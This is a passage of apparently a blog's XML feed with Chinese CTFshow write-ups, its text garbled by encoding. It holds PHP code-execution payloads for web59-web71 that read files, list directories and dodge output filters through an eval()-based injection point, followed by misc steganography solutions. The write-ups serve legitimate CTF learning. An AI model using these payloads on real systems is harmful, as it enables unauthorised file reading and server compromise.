operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">''</span>flag<span class="token punctuation">.</span>php<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°ï¼š"><a href="#å‡½æ•°ï¼š" class="headerlink" title="å‡½æ•°ï¼š"></a>å‡½æ•°ï¼š</h3><pre><code>file â€” æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­readfile â€” è¾“å‡ºæ–‡ä»¶,è¯»å–æ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚</code></pre><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>æºç ä¸€æ ·ï¼Œèšå‰‘å¯ä»¥è¿æ¥ä¸Šï¼Œä½†æ˜¯flag.phpæ˜¯æ²¡æœ‰åŠæ³•è¯»å–çš„</p><h3 id="payloadï¼š-11"><a href="#payloadï¼š-11" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//paylaodæ±‡æ€»</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">"1000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fpassthru</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°ï¼š-1"><a href="#å‡½æ•°ï¼š-1" class="headerlink" title="å‡½æ•°ï¼š"></a>å‡½æ•°ï¼š</h3><pre><code>feof â€” æµ‹è¯•æ–‡ä»¶æŒ‡é’ˆæ˜¯å¦åˆ°äº†æ–‡ä»¶ç»“æŸçš„ä½ç½®fgets â€” ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œfgetc â€” ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–å­—ç¬¦fread â€” è¯»å–æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæœ€å¤šè¯»å–çš„å­—èŠ‚æ•°fpassthru â€” è¾“å‡ºæ–‡ä»¶æŒ‡é’ˆå¤„çš„æ‰€æœ‰å‰©ä½™æ•°æ®fgetcsv â€” ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å…¥ä¸€è¡Œå¹¶è§£æ CSV å­—æ®µï¼Œcsvæ˜¯é€—å·åˆ†éš”å€¼æ–‡ä»¶æ ¼å¼ï¼Œä¸€èˆ¬ç”¨WORDPADæˆ–è®°äº‹æœ¬(NOTE),EXCELæ‰“å¼€ã€‚csv(é€—å·åˆ†éš”å€¼)æ˜¯ä¸€ç§ç”¨æ¥å­˜å‚¨æ•°æ®çš„çº¯æ–‡æœ¬æ–‡ä»¶ï¼Œé€šå¸¸éƒ½æ˜¯ç”¨äºå­˜æ”¾ç”µå­è¡¨æ ¼æˆ–æ•°æ®çš„ä¸€ç§æ–‡ä»¶æ ¼å¼ã€‚ä¸‹é¢å’Œå¤§å®¶åˆ†äº«ä¸‹å‡ ç§å¸¸ç”¨çš„CSVæ–‡ä»¶æ‰“å¼€æ–¹æ³•ã€‚</code></pre><h2 id="web60-web65"><a href="#web60-web65" class="headerlink" title="web60-web65"></a>web60-web65</h2><p>ä¸‹é¢æºç ä¸€æ ·æˆ‘å°±ä¸é‡å¤äº†</p><h3 id="payloadï¼š-12"><a href="#payloadï¼š-12" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç›®å½•æ‰«æ</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä»¥è¯»çš„å½¢å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒæ—¶ç”¨whileå¾ªç¯æ¥ä¿è¯æ–‡ä»¶è¢«æ­£å¸¸è¯»å–å®Œï¼Œç„¶åè¾“å‡ºflag.phpçš„æ¯ä¸€è¡Œæ–‡ä»¶</p><h2 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h2><p>print_rã€fileã€show_sourceç­‰å‡è¢«banäº†</p><p>æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è·å–ç›®å½•ï¼š</p><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.txt</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><p>æ–°å§¿åŠ¿ï¼š</p><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*');foreach($a as $f){echo($f->__toString()." ");}//globçš„ä½œç”¨æ˜¯è§„å®šåé¢çš„åŒ¹é…æ ¼å¼ï¼ŒæŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">"=>"</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶ååˆ©ç”¨ï¼š</p><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°è§£é‡Šï¼š"><a href="#å‡½æ•°è§£é‡Šï¼š" class="headerlink" title="å‡½æ•°è§£é‡Šï¼š"></a>å‡½æ•°è§£é‡Šï¼š</h3><p>ob_get_contents â€” è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹</p><h4 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h4><p>string <strong>ob_get_contents</strong>    ( void   )</p><p>åªæ˜¯å¾—åˆ°è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ï¼Œä½†ä¸æ¸…é™¤å®ƒã€‚   </p><h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>æ­¤å‡½æ•°è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ï¼Œæˆ–è€…å¦‚æœè¾“å‡ºç¼“å†²åŒºæ— æ•ˆå°†è¿”å›<strong><code>FALSE</code></strong> ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²</span><span class="token keyword">echo</span> <span class="token string">"Hello "</span><span class="token punctuation">;</span><span class="token variable">$out1</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"World"</span><span class="token punctuation">;</span><span class="token variable">$out2</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$out1</span><span class="token punctuation">,</span> <span class="token variable">$out2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šä¾‹ç¨‹ä¼šè¾“å‡ºï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"Hello "</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string">"Hello World"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ob_end_clean â€” æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</p><h4 id="è¯´æ˜-1"><a href="#è¯´æ˜-1" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h4><p>bool <strong>ob_end_clean</strong>    ( void   )</p><p>æ­¤å‡½æ•°ä¸¢å¼ƒæœ€é¡¶å±‚è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶å…³é—­è¿™ä¸ªç¼“å†²åŒºã€‚å¦‚æœæƒ³è¦è¿›ä¸€æ­¥å¤„ç†ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¿…é¡»åœ¨<strong>ob_end_clean()</strong>ä¹‹å‰è°ƒç”¨ob_get_contents()ï¼Œå› ä¸ºå½“è°ƒç”¨<strong>ob_end_clean()</strong>æ—¶ç¼“å†²åŒºå†…å®¹å°†è¢«ä¸¢å¼ƒã€‚    </p><h4 id="è¿”å›å€¼-1"><a href="#è¿”å›å€¼-1" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>   æˆåŠŸæ—¶è¿”å› <strong><code>TRUE</code></strong>ï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› <strong><code>FALSE</code></strong>ã€‚ é”™è¯¯çš„åŸå› é¦–å…ˆæ˜¯ï¼Œåœ¨è°ƒç”¨æ—¶æ²¡æœ‰ä¸€ä¸ªèµ·ä½œç”¨çš„ç¼“å†²åŒºï¼Œæˆ–è€…æ˜¯å› ä¸ºæŸäº›åŸå› ç¼“å†²åŒºä¸èƒ½è¢«åˆ é™¤ï¼ˆå¯èƒ½å¯¹ç‰¹æ®Šç¼“å†²åŒºè€Œè¨€ï¼‰ã€‚ </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'Text that won\'t get displayed.'</span><span class="token punctuation">;</span><span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¹¶ä¸ä¼šæœ‰è¾“å‡ºç»“æœ</p><p>è¿™é“é¢˜ç›®è¿™ä¹ˆåšçš„ç›®çš„ï¼Œé‡åœ¨ä½“ç°å°†æ•´ä¸ªåé¢çš„ä»£ç å…¨éƒ¨æˆªæ–­ï¼Œå› ä¸ºè¿™ä¸ªä¸œè¥¿é’ˆå¯¹çš„æ˜¯æ‰€æœ‰çš„è¾“å‡ºæµï¼Œåªè¦å¡«å—å­˜åœ¨é‚£ä¹ˆæˆ‘ä»¬è·å–åˆ°è¾“å‡ºæ‰§è¡Œçš„ç»“æœä¸­çš„æ•°å­—å’Œå­—æ¯å°†å…¨æ˜¯é—®å·</p><h3 id="payloadï¼š-13"><a href="#payloadï¼š-13" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">"=>"</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æ³„éœ² </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹misc</title>
      <link href="/2021/01/24/ctfshow-zhi-misc/"/>
      <url>/2021/01/24/ctfshow-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1300994613&auto=1&height=66"></iframe><h1 id="2021-01-24"><a href="#2021-01-24" class="headerlink" title="2021-01-24"></a>2021-01-24</h1><h2 id="å¤§å‰å¤§åˆ©æ¯"><a href="#å¤§å‰å¤§åˆ©æ¯" class="headerlink" title="å¤§å‰å¤§åˆ©æ¯"></a>å¤§å‰å¤§åˆ©æ¯</h2><h3 id="è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—"><a href="#è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—" class="headerlink" title="è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—"></a>è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—</h3><p>å¾—åˆ°äºŒç»´ç 1.png</p><p>é€šè¿‡foremoståˆ†ç¦»å¾—åˆ°å¦å¤–3ä¸ª</p><p>å†…å®¹åˆ†åˆ«æ˜¯ï¼š</p><p>1ï¼šè¯·é—®DJB CTFæ¯”èµ›çš„ç­¾åˆ°å¤„åœ¨ä»€ä¹ˆåœ°æ–¹</p><p>2ï¼šè¿˜è¦å¾€å‰èµ°â€¦â€¦æ˜¯ä¸æ˜¯åœ¨è¿™ä¸ªè·¯å£è½¬å¼¯å‘¢?<br>3ï¼šå¥½åƒæ²¡æœ‰å²”è·¯äº†ï¼Œä¸€ç›´å¾€å‰èµ°è¯•è¯•çœ‹<br>4ï¼šå’¦ï¼Œè¿™æ˜¯æ­»èƒ¡åŒï¼Œæ˜¯ä¸æ˜¯å“ªé‡Œèµ°é”™è·¯äº†</p><p>å…³é”®çš„åœ°æ–¹åœ¨2.pngï¼Œç”¨stegsolveï¼Œ<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8824%E6%97%A52307_1.png" alt></p><p>å¾—åˆ°å›¾æ¡ˆï¼Œå¯¹æ¯”å‘ç°æ˜¯çŒªåœˆå¯†ç ï¼Œå¯¹ç…§è§£ç å¾—åˆ°flagï¼š<br>flag{dajiadoaidjb}</p><h3 id="åå…«èˆ¬å…µå™¨"><a href="#åå…«èˆ¬å…µå™¨" class="headerlink" title="åå…«èˆ¬å…µå™¨"></a>åå…«èˆ¬å…µå™¨</h3><p>é¡ºåºï¼šåˆ€ã€æªã€å‰‘ã€æˆŸã€æ–§ã€é’ºã€é’©ã€å‰ã€é­ã€é”ã€é”¤ã€æˆˆã€é•‹ã€æ£ã€æ§Šã€æ£’ã€çŸ›ã€è€™</p><p>ä¸‹è½½å¾—åˆ°raræ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°æ‰¹æ³¨æ˜¯ï¼š2021ç‰›å¹´å¤§å‰ï¼Œè¿™ä¸ªå°±æ˜¯è§£å‹å¯†ç </p><p>hint1:JPHS<br>hint2:ç”¨Notepad++æ‰“å¼€è¯•è¯•ï¼Ÿ<br>hint3:å‰åç§å…µå™¨å¯¹åº”10è¿›åˆ¶ï¼Œåå…«ç§å¯¹åº”8è¿›åˆ¶</p><p>ç”¨jphswinæ‰“å¼€ï¼Œç”¨seekï¼Œå°†æ£’.jpgä¿å­˜ï¼Œå¾—åˆ°txtæ–‡æœ¬ï¼Œä¸‹æ‹‰åˆ°æœ€åå¾—åˆ°34635</p><p>å°†18ä¸ªå…µå™¨åé¢è—çš„æ•°å­—ä¸€æ¬¡å†™ä¸‹æ¥ï¼Œå¹¶ä¸”æŒ‰ç…§é¢˜ç›®ç»™çš„é¡ºåºæ’åˆ—ã€‚å†åŠ ä¸Šæç¤ºè¯´å‰10ä¸ªæ˜¯10è¿›åˆ¶ï¼Œå8ä¸ªæ˜¯8è¿›åˆ¶ï¼Œå¯ä»¥å¾—åˆ°ä¸¤ç»„æ•°å­—ï¼š</p><p>1361 4399 9223 1635 2581 7639 7978 5870 0963 935 30440 53720 46055 62766 10613 34635 37242 30575<br>ä¸¤ç»„åˆ†åˆ«åˆå¹¶ å¾—åˆ°<br>136143999223163525817639797858700963935<br>3044053720460556276610613346353724230575</p><p>16è¿›åˆ¶ï¼š</p><p>666c61677b43544673686f775f31305f</p><p>62415f42616e5f62316e675f51317d</p><p>666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</p><p>16â†’textï¼šflag{CTFshow_10_bA_Ban_b1ng_Q1}</p><h1 id="2021-02-08"><a href="#2021-02-08" class="headerlink" title="2021-02-08"></a>2021-02-08</h1><h2 id="æ‚é¡¹ç­¾åˆ°"><a href="#æ‚é¡¹ç­¾åˆ°" class="headerlink" title="æ‚é¡¹ç­¾åˆ°"></a>æ‚é¡¹ç­¾åˆ°</h2><p>ä¼ªåŠ å¯†flag{79ddfa61bda03defa7bfd8d702a656e4}</p><h2 id="misc2"><a href="#misc2" class="headerlink" 